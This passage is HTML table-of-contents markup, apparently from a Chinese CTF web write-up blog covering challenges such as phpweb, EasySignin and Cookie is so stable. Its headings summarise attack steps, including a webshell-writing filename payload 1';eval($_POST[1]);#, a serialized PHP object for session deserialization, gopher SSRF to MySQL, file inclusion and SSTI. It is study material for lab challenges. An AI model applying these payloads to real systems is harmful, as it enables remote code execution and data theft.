href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E8%BF%98%E6%98%AF%E7%BB%A7%E7%BB%AD%E5%AE%A1%E8%AE%A1%E6%BA%90%E4%BB%A3%E7%A0%81%E5%90%A7%EF%BC%8C%E8%BF%99%E9%87%8C%E5%87%BA%E9%A2%98%E4%BA%BA%E7%BB%99%E4%BA%86%E4%B8%A4%E4%B8%AA%E6%8F%90%E7%A4%BA%E7%82%B9-%E5%92%8C-O%EF%BC%8C%E5%88%86%E5%88%AB%E5%9C%A8"><span class="toc-number">19.0.6.</span> <span class="toc-text">接下来还是继续审计源代码吧，这里出题人给了两个提示点:)和:O，分别在</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8session%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%9D%A5%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8C%E5%88%9A%E5%A5%BD%E6%88%91%E4%BB%AC%E4%B9%9F%E6%9C%89%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84%E5%8A%9F%E8%83%BD%EF%BC%8C%E5%9C%A8session-start%E7%9A%84%E5%90%8C%E6%97%B6%E4%B8%8A%E4%BC%A0session%E6%96%87%E4%BB%B6%E4%B8%8D%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%AE%9E%E7%8E%B0%E6%8E%A7%E5%88%B6session%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E6%9D%A5%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%86%E5%90%97"><span class="toc-number">19.0.7.</span> <span class="toc-text">所以我们可以利用session写入文件来进行反序列化，刚好我们也有上传文件的功能，在session_start的同时上传session文件不就可以实现控制session文件的内容来反序列化了吗</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E8%83%BD%E5%8A%9B%E6%9C%89%E4%BA%86%EF%BC%8C%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%B0%B1%E6%98%AF%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8E%BB%E5%81%9A%E4%BB%80%E4%B9%88%E4%BA%86"><span class="toc-number">19.0.8.</span> <span class="toc-text">启动反序列化的能力有了，接下来就是反序列化去做什么了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E7%9A%84%E5%BD%93recoed-php%E4%B8%8D%E4%B8%BA%E7%A9%BA%E6%97%B6%E5%86%99%E5%85%A5log%E7%9A%84%E5%8A%9F%E8%83%BD%E7%BB%99%E4%BA%86%E6%88%91%E4%BB%AC%E6%A4%8D%E5%85%A5%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%8F%AF%E4%B9%98%E4%B9%8B%E6%9C%BA%EF%BC%8C%E5%88%A9%E7%94%A8data%E4%B8%AD%E5%8C%85%E5%90%AB%E7%9A%84avatar%E7%9A%84%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E5%8A%A0%E4%B9%8Bphp%E6%96%87%E4%BB%B6%E7%9A%84-%E5%88%86%E5%8F%A5%E5%92%8C-%E6%B3%A8%E9%87%8A%E5%8A%9F%E8%83%BD%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%B0%B1%E5%8F%AF%E4%BB%A5%E5%B0%86%E6%96%87%E4%BB%B6%E5%90%8D%E8%AE%BE%E7%BD%AE%E4%B8%BA1-eval-POST-1-%E6%9D%A5%E5%86%99%E9%A9%AC"><span class="toc-number">19.0.9.</span> <span class="toc-text">这里的当recoed.php不为空时写入log的功能给了我们植入木马的可乘之机，利用data中包含的avatar的文件路径加之php文件的;分句和#注释功能，所以我们就可以将文件名设置为1&#39;;eval($_POST[1]);#来写马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%B0%B1%E8%A6%81%E8%AE%A9record-php%E4%B8%8D%E4%B8%BA%E7%A9%BA%EF%BC%8C%E5%88%9A%E5%A5%BD-toString-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%8F%AF%E4%BB%A5%E5%86%99%E5%85%A5%EF%BC%8C%E6%89%80%E4%BB%A5%E5%8F%AA%E8%A6%81%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%9C%80%E7%BB%88%E6%89%A7%E8%A1%8C%E5%88%B0-toString-%E5%8D%B3%E5%8F%AF%EF%BC%8C%E6%89%80%E4%BB%A5%E8%A6%81%E8%AE%A9class-Log%E8%A2%AB%E8%A7%86%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E5%88%9A%E5%A5%BDConfig%E7%9A%84showconf%E7%9A%84-file-get-contents-this-avatar-%E4%BC%9A%E5%B0%86%E4%BB%96%E7%9A%84%E4%B8%80%E4%B8%AA%E5%85%83%E7%B4%A0%E8%A7%86%E4%B8%BA%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E5%88%9A%E5%A5%BDConfig%E7%9A%84-sleep-%E4%BC%9A%E6%89%A7%E8%A1%8Cshowconf%EF%BC%8C%E8%BF%99%E6%A0%B7%E9%93%BE%E5%AD%90%E5%B0%B1%E6%89%BE%E5%88%B0%E4%BA%86"><span class="toc-number">19.0.10.</span> <span class="toc-text">所以我们就要让record.php不为空，刚好__toString()魔术方法可以写入，所以只要反序列化最终执行到__toString()即可，所以要让class Log被视为字符串，刚好Config的showconf的(file_get_contents($this-&gt;avatar)会将他的一个元素视为字符串，刚好Config的__sleep()会执行showconf，这样链子就找到了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E4%B8%BA%E4%BA%86%E6%96%87%E4%BB%B6%E8%A2%AB%E8%A7%86%E4%B8%BAsession%E6%96%87%E4%BB%B6%EF%BC%8C%E5%B0%86%E6%96%87%E4%BB%B6%E5%90%8D%E5%91%BD%E5%90%8D%E4%B8%BAsess-xxx%EF%BC%8C%E5%86%8D%E5%B0%86%E5%88%9A%E6%89%8D%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E5%A1%AB%E8%BF%9B%E5%8E%BB%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E8%BF%98%E6%9C%89%E6%A0%B9%E6%8D%AE%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8Fsession-serialize-handler%E5%B0%86%E6%88%91%E4%BB%AC%E7%9A%84%E6%96%87%E4%BB%B6%E6%94%B9%E4%B8%BA%E5%AF%B9%E5%BA%94%E7%9A%84%E6%A0%BC%E5%BC%8F"><span class="toc-number">19.0.11.</span> <span class="toc-text">然后为了文件被视为session文件，将文件名命名为sess_xxx，再将刚才的序列化对象填进去，这里我们还有根据环境变量session.serialize_handler将我们的文件改为对应的格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%80%E4%BB%A5%E8%BF%99%E9%87%8C%E6%88%91%E4%BB%AC%E8%A6%81%E7%94%A8-%E5%B0%86%E6%88%91%E4%BB%AC%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%AF%B9%E8%B1%A1%E6%94%BE%E5%9C%A8%E5%85%B6%E5%90%8E%E9%9D%A2%E6%89%8D%E8%83%BD%E5%90%AF%E5%8A%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8C%E6%9C%80%E7%BB%88%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E4%B8%BAxianxin-O-6-Config-7-s-5-uname-N-s-6-passwd-N-s-6-avatar-O-3-Log-1-s-4-data-s-11-log-start-s-8-nickname-N-s-3-sex-N-s-4-mail-N-s-6-telnum-N"><span class="toc-number">19.0.12.</span> <span class="toc-text">所以这里我们要用|将我们的序列化对象放在其后面才能启动反序列化，最终文件内容为xianxin|O:6:&quot;Config&quot;:7:{s:5:&quot;uname&quot;;N;s:6:&quot;passwd&quot;;N;s:6:&quot;avatar&quot;;O:3:&quot;Log&quot;:1:{s:4:&quot;data&quot;;s:11:&quot;log_start()&quot;;}s:8:&quot;nickname&quot;;N;s:3:&quot;sex&quot;;N;s:4:&quot;mail&quot;;N;s:6:&quot;telnum&quot;;N;}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E5%9C%A8%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%9A%84%E5%90%8C%E6%97%B6%E5%90%AF%E5%8A%A8session-start%EF%BC%8C%E8%BF%98%E8%A6%81%E5%B0%86cookie%E8%AE%BE%E7%BD%AE%E4%B8%BAPHPSESSID-xxx-%E6%8A%93%E5%8C%85%E5%A4%84%E7%90%86"><span class="toc-number">19.0.13.</span> <span class="toc-text">然后就是在文件上传的同时启动session_start，还要将cookie设置为PHPSESSID&#x3D;xxx,抓包处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E6%98%AF%E5%86%99%E9%A9%AC%E4%BA%86"><span class="toc-number">19.0.14.</span> <span class="toc-text">然后就是写马了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%A5%E4%B8%8B%E6%9D%A5%E5%8E%BB%E8%AE%BF%E9%97%AErecord-php%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%BA%86"><span class="toc-number">19.0.15.</span> <span class="toc-text">接下来去访问record.php就可以任意命令执行了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%97%E5%88%B0flag-1"><span class="toc-number">19.0.16.</span> <span class="toc-text">得到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Mark-loves-cat"><span class="toc-number">20.</span> <span class="toc-text">[BJDCTF2020]Mark loves cat</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E5%85%A5%E9%A1%B5%E9%9D%A2%E9%9D%9E%E5%B8%B8%E5%A4%9A%E6%8C%89%E9%92%AE%EF%BC%8C%E5%85%88%E4%B8%8D%E6%80%A5%E7%9D%80%E4%B8%80%E4%B8%AA%E4%B8%AA%E7%9C%8B%EF%BC%8C%E5%85%88dirsearch%E6%89%AB%E4%B8%80%E4%B8%8B%EF%BC%8C%E6%89%AB%E5%88%B0-git%EF%BC%8C%E7%9B%B4%E6%8E%A5githack%E5%90%AF%E5%8A%A8%EF%BC%8C%E5%BE%97%E5%88%B0%E6%BA%90%E4%BB%A3%E7%A0%81"><span class="toc-number">20.0.1.</span> <span class="toc-text">进入页面非常多按钮，先不急着一个个看，先dirsearch扫一下，扫到.git，直接githack启动，得到源代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%B1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%8C%E6%9C%AC%E5%9C%B0%E4%B8%80%E7%82%B9%E7%82%B9%E8%AF%95%EF%BC%8C%E6%8A%8A-flag%E8%BE%93%E5%87%BA%E5%87%BA%E6%9D%A5%E5%B0%B1%E5%A5%BD"><span class="toc-number">20.0.2.</span> <span class="toc-text">然后就代码审计，本地一点点试，把$flag输出出来就好</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E8%AF%95%E5%87%BA%E6%9D%A5%E4%B8%80%E7%A7%8Dpayload"><span class="toc-number">20.0.3.</span> <span class="toc-text">最后试出来一种payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BE%97%E5%88%B0flag-2"><span class="toc-number">20.0.4.</span> <span class="toc-text">得到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb"><span class="toc-number">21.</span> <span class="toc-text">[网鼎杯 2020 朱雀组]phpweb</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E9%A1%B5%E9%9D%A2%E5%8F%91%E7%8E%B0%E4%B8%80%E7%9B%B4%E5%9C%A8%E5%8F%98%EF%BC%8C%E6%8A%93%E5%8C%85%E7%9C%8B%E4%B8%80%E4%B8%8B%E5%8F%91%E7%8E%B0%E4%B8%80%E7%9B%B4%E5%9C%A8%E8%87%AA%E5%8A%A8%E4%BC%A0%E5%85%A5func%E5%92%8Cp%E4%B8%A4%E4%B8%AA%E5%8F%82%E6%95%B0%EF%BC%8C%E9%BB%98%E8%AE%A4%E4%B8%BAdata%E5%92%8C%E4%B8%80%E4%B8%B2%E7%9C%8B%E4%B8%8D%E6%87%82%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%8C%E5%B0%86func%E9%9A%8F%E6%89%8B%E5%88%A0%E6%8E%89%E4%B8%80%E7%82%B9%E5%8F%98%E4%B8%BAdat%EF%BC%8C%E5%8F%91%E7%8E%B0%E6%8A%A5%E9%94%99call-user-func-expects-parameter-1-to-be-a-valid-callback%EF%BC%8C%E4%B8%94%E9%80%8F%E9%9C%B2%E4%BA%86call-user-func-%E4%B8%BA%E4%B8%A4%E4%B8%AA%E5%8F%82%E6%95%B0%E7%9A%84%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E8%BF%99%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8CRCE"><span class="toc-number">21.0.1.</span> <span class="toc-text">打开页面发现一直在变，抓包看一下发现一直在自动传入func和p两个参数，默认为data和一串看不懂的字符串，将func随手删掉一点变为dat，发现报错call_user_func() expects parameter 1 to be a valid callback，且透露了call_user_func()为两个参数的执行命令，所以我们可以利用这一个函数进行RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BD%86%E6%98%AF%E5%B0%9D%E8%AF%95%E4%BA%86system%EF%BC%8Ceval%EF%BC%8Cassert%E7%AD%89%E5%87%A0%E4%B8%AA%E5%90%8E%E5%8F%91%E7%8E%B0%E5%9B%9E%E6%98%BEhacker-%EF%BC%8C%E5%88%A4%E6%96%AD%E6%9C%89%E8%BF%87%E6%BB%A4%EF%BC%8C%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8file-get-contents%E6%9D%A5%E5%85%88%E8%AF%BB%E5%8F%96%E4%B8%80%E4%B8%8Bindex-php"><span class="toc-number">21.0.2.</span> <span class="toc-text">但是尝试了system，eval，assert等几个后发现回显hacker!，判断有过滤，这里可以利用file_get_contents来先读取一下index.php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%9A%84%E6%8C%BA%E5%85%A8%EF%BC%8C%E4%BD%86%E6%98%AF%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8Test%E7%B1%BB%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-destruct-%E6%9D%A5%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E5%88%A9%E7%94%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%8C%E5%88%A9%E7%94%A8call-user-func-%E6%9D%A5%E6%9E%84%E9%80%A0unserialize%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">21.0.3.</span> <span class="toc-text">过滤的挺全，但是我们可以利用Test类的魔术方法__destruct()来绕过过滤，也就是利用反序列化，利用call_user_func()来构造unserialize函数进行反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%88ls-%E4%B8%80%E4%B8%8B%E6%B2%A1%E6%9C%89%E5%8F%91%E7%8E%B0flag%EF%BC%8C%E6%89%80%E4%BB%A5%E7%9B%B4%E6%8E%A5find%E6%89%BE%EF%BC%8C%E6%89%BE%E5%88%B0%E5%90%8Ecat%E5%B0%B1%E6%8B%BF%E5%88%B0flag%E4%BA%86"><span class="toc-number">21.0.4.</span> <span class="toc-text">先ls &#x2F;一下没有发现flag，所以直接find找，找到后cat就拿到flag了</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EasySignin-1"><span class="toc-number">22.</span> <span class="toc-text">EasySignin</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E7%8E%AF%E5%A2%83%E6%98%AF%E4%B8%AA%E7%99%BB%E5%BD%95%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%B8%8B%E9%9D%A2%E8%BF%98%E6%9C%89%E4%B8%AA%E6%B3%A8%E5%86%8C%E8%B7%B3%E8%BD%AC%EF%BC%8C%E5%85%88%E5%8E%BB%E6%B3%A8%E5%86%8C%E4%B8%80%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0admin%E7%94%A8%E6%88%B7%E5%90%8D%E8%A2%AB%E5%8D%A0%E7%94%A8%EF%BC%8C%E4%BA%8E%E6%98%AF%E6%B3%A8%E5%86%8C%E4%BA%86%E4%B8%AAadmin1%EF%BC%8C%E7%84%B6%E5%90%8E%E7%99%BB%E5%BD%95%E3%80%82-1"><span class="toc-number">22.0.1.</span> <span class="toc-text">打开环境是个登录页面，下面还有个注册跳转，先去注册一下，然后发现admin用户名被占用，于是注册了个admin1，然后登录。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%9B%BE%E7%89%87%EF%BC%8C%E4%BD%86%E6%98%AF%E7%82%B9%E8%BF%9B%E5%8E%BB%E5%8F%91%E7%8E%B0%E8%A2%AB%E9%99%90%E5%88%B6%E4%B8%8D%E8%AE%A9%E7%9C%8B%EF%BC%8C%E8%81%94%E7%B3%BB%E5%89%8D%E9%9D%A2%E7%9A%84admin%E7%94%A8%E6%88%B7%E5%90%8D%E8%A2%AB%E5%8D%A0%E7%94%A8%EF%BC%8C%E5%88%A4%E6%96%AD%E5%8F%AF%E8%83%BD%E8%A6%81%E8%B6%8A%E6%9D%83%E7%99%BB%E5%BD%95admin%E8%B4%A6%E5%8F%B7%E6%89%8D%E8%83%BD%E7%9C%8B%EF%BC%8C%E5%88%9A%E5%A5%BD%E6%97%81%E8%BE%B9%E8%BF%98%E6%9C%89%E4%B8%AA%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%EF%BC%8C%E5%8E%BB%E6%8A%93%E5%8C%85%E8%AF%A5%E9%A1%B5%E9%9D%A2%E7%9A%84%E8%AF%B7%E6%B1%82%EF%BC%8C%E6%9E%9C%E7%84%B6%E4%BC%A0%E5%85%A5%E7%9A%84%E5%8F%82%E6%95%B0%E6%9C%89%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E7%AE%80%E5%8D%95%E4%BA%86%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8A%8A%E7%94%A8%E6%88%B7%E5%90%8Dadmin1%E6%94%B9%E6%88%90admin%E5%B0%B1%E8%83%BD%E4%BF%AE%E6%94%B9admin%E7%9A%84%E5%AF%86%E7%A0%81%EF%BC%8C%E8%BF%9B%E8%80%8C%E7%99%BB%E5%BD%95%E5%85%B6%E8%B4%A6%E5%8F%B7%E4%BA%86%E3%80%82-1"><span class="toc-number">22.0.2.</span> <span class="toc-text">登录后可以看图片，但是点进去发现被限制不让看，联系前面的admin用户名被占用，判断可能要越权登录admin账号才能看，刚好旁边还有个修改密码，去抓包该页面的请求，果然传入的参数有用户名，这样就简单了，直接把用户名admin1改成admin就能修改admin的密码，进而登录其账号了。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8E%BB%E7%9C%8B%E5%9B%BE%E7%89%87%E6%9E%9C%E7%84%B6%E5%B0%B1%E5%8F%AF%E4%BB%A5%E4%BA%86%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%B1%E8%A2%AB%E5%9B%BE%E5%90%B8%E5%BC%95%E4%BA%86%EF%BC%8C%E6%83%B3%E7%9D%80%E5%8F%AF%E8%83%BD%E5%9B%BE%E7%89%87%E9%87%8C%E9%9D%A2%E8%97%8F%E7%9D%80flag%EF%BC%8C%E7%84%B6%E5%90%8E%E5%B0%B1%E5%92%8Cflag%E6%B8%90%E8%A1%8C%E6%B8%90%E8%BF%9C%E4%BA%86-1"><span class="toc-number">22.0.3.</span> <span class="toc-text">登录后去看图片果然就可以了，然后就被图吸引了，想着可能图片里面藏着flag，然后就和flag渐行渐远了</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E4%B8%80%E6%AE%B5%E6%97%B6%E9%97%B4%E5%90%8E%E7%8E%AF%E5%A2%83%E5%85%B3%E4%BA%86%E9%87%8D%E6%96%B0%E5%BC%84%E4%BA%86%E4%B8%80%E9%81%8D%E6%89%8D%E5%8F%91%E7%8E%B0%E5%9B%BE%E7%89%87%E8%BF%98%E6%98%AF%E9%9A%8F%E6%9C%BA%E7%9A%84%EF%BC%8C%E7%88%BD%E7%9C%8B%E5%9B%BE%E7%89%87%E5%96%B5-1"><span class="toc-number">22.0.4.</span> <span class="toc-text">然后一段时间后环境关了重新弄了一遍才发现图片还是随机的，爽看图片喵</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E6%B3%A8%E6%84%8F%E5%88%B0url%E4%B8%ADget%E4%BA%86%E4%B8%80%E4%B8%AAurl%E7%9A%84%E5%8F%82%E6%95%B0%E4%BD%9C%E4%B8%BA%E5%9B%9E%E6%98%BE%E5%9B%BE%E7%89%87%E7%9A%84%E7%BD%91%E5%9D%80%EF%BC%8C%E6%89%80%E4%BB%A5%E6%88%91%E4%BB%AC%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87%E4%BF%AE%E6%94%B9%E8%BF%99%E4%B8%AAurl%E5%8F%82%E6%95%B0%E6%9D%A5%E5%81%9A%E5%88%B0ssrf%EF%BC%8C%E4%BD%86%E6%98%AF%E5%B0%9D%E8%AF%95%E5%A4%9A%E6%AC%A1%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8file%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E9%83%BD%E5%9C%A8%E6%BA%90%E4%BB%A3%E7%A0%81base64%E5%9B%9E%E6%98%BEbm9ub25v-nonono-%EF%BC%8C%E4%B9%9F%E5%B0%B1%E6%98%AF%E4%BB%A3%E8%A1%A8%E5%8F%AF%E8%83%BD%E8%A2%AB%E8%BF%87%E6%BB%A4-1"><span class="toc-number">22.0.5.</span> <span class="toc-text">这里注意到url中get了一个url的参数作为回显图片的网址，所以我们可以通过修改这个url参数来做到ssrf，但是尝试多次直接利用file伪协议读取都在源代码base64回显bm9ub25v(nonono)，也就是代表可能被过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E5%8F%AF%E4%BB%A5%E7%94%A8gopher-127-0-0-1-%E7%AB%AF%E5%8F%A3%E6%9D%A5%E5%88%A4%E6%96%AD%E9%82%A3%E4%B8%80%E4%B8%AA%E8%83%BD%E6%94%BB%E5%87%BB-1"><span class="toc-number">22.0.6.</span> <span class="toc-text">这里可以用gopher:&#x2F;&#x2F;127.0.0.1:端口来判断那一个能攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%88%A4%E6%96%AD%E5%87%BAMySQL%E6%98%AF%E6%9C%89%E5%9B%9E%E6%98%BE%E7%9A%84%EF%BC%8C%E8%BF%99%E6%A0%B7%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%94%A8gopherus%E5%86%99%E5%85%A5MySQL%E5%91%BD%E4%BB%A4show-database-%E5%92%8Cselect-load-file-flag-%E4%BA%86%EF%BC%8C%E8%BF%99%E9%87%8C%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4MySQL%E7%94%A8%E6%88%B7%E5%90%8Droot%EF%BC%8C%E7%84%B6%E5%90%8Eurl%E7%BC%96%E7%A0%81%E4%B8%80%E6%AC%A1%E5%8D%B3%E5%8F%AF%E3%80%82-1"><span class="toc-number">22.0.7.</span> <span class="toc-text">然后判断出MySQL是有回显的，这样就可以用gopherus写入MySQL命令show database;和select load_file(&#39;&#x2F;flag&#39;);了，这里使用默认MySQL用户名root，然后url编码一次即可。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%86%E5%9B%9E%E6%98%BEbase64%E8%A7%A3%E7%A0%81%E5%BE%97%E5%88%B0flag-1"><span class="toc-number">22.0.8.</span> <span class="toc-text">将回显base64解码得到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NCTF2019-Fake-XML-cookbook"><span class="toc-number">23.</span> <span class="toc-text">[NCTF2019]Fake XML cookbook</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E6%9C%89%E5%85%B3xxe%E6%BC%8F%E6%B4%9E%E7%9A%84%E9%A2%98"><span class="toc-number">23.0.1.</span> <span class="toc-text">一个有关xxe漏洞的题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">24.</span> <span class="toc-text">[GWCTF 2019]我有一个数据库</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%93%E5%BC%80%E8%BF%98%E6%98%AF%E5%87%A0%E4%B9%8E%E5%95%A5%E4%B9%9F%E6%B2%A1%E6%9C%89%EF%BC%8C%E7%9B%B4%E6%8E%A5dirsearch%E6%89%AB%EF%BC%8C%E6%89%AB%E5%87%BA%E6%9D%A5phpmyadmin%E9%A1%B5%E9%9D%A2%EF%BC%8C%E4%B8%BAphpmyadmin%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">24.0.1.</span> <span class="toc-text">打开还是几乎啥也没有，直接dirsearch扫，扫出来phpmyadmin页面，为phpmyadmin数据库</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%B9%B6%E6%B3%A8%E6%84%8Fphpmyadmin%E7%89%88%E6%9C%AC%E4%B8%BA4-8-1%EF%BC%8C%E5%88%A4%E6%96%AD%E5%8F%AF%E8%83%BD%E6%9C%89CVE-2018-12613%EF%BC%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%8CphpMyAdmin-4-8-0-4-8-1%EF%BC%89"><span class="toc-number">24.0.2.</span> <span class="toc-text">查询相关漏洞并注意phpmyadmin版本为4.8.1，判断可能有CVE-2018-12613（文件包含漏洞，phpMyAdmin 4.8.0-4.8.1）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%84%B6%E5%90%8E%E5%B0%9D%E8%AF%95%E5%8C%85%E5%90%AB%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%EF%BC%8C%E5%BE%97%E5%88%B0flag"><span class="toc-number">24.0.3.</span> <span class="toc-text">然后尝试包含本地文件，得到flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BJDCTF2020-Cookie-is-so-stable"><span class="toc-number">25.</span> <span class="toc-text">[BJDCTF2020]Cookie is so stable</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag%E9%A1%B5%E9%9D%A2%E8%83%BD%E7%99%BB%E5%BD%95%EF%BC%8C%E7%99%BB%E5%BD%95%E5%90%8E%E4%BC%9A%E5%9B%9E%E6%98%BE%E5%87%BA%E6%88%91%E4%BB%AC%E8%BE%93%E5%85%A5%E7%9A%84%E7%94%A8%E6%88%B7%E5%90%8D%EF%BC%8C%E8%A6%81%E6%83%B3%E5%88%B0ssti%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5"><span class="toc-number">25.0.1.</span> <span class="toc-text">flag页面能登录，登录后会回显出我们输入的用户名，要想到ssti模版注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%9D%E8%AF%95%E5%90%8E%E4%B8%BATwig%E6%A8%A1%E5%9D%97"><span class="toc-number">25.0.2.</span> <span class="toc-text">尝试后为Twig模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 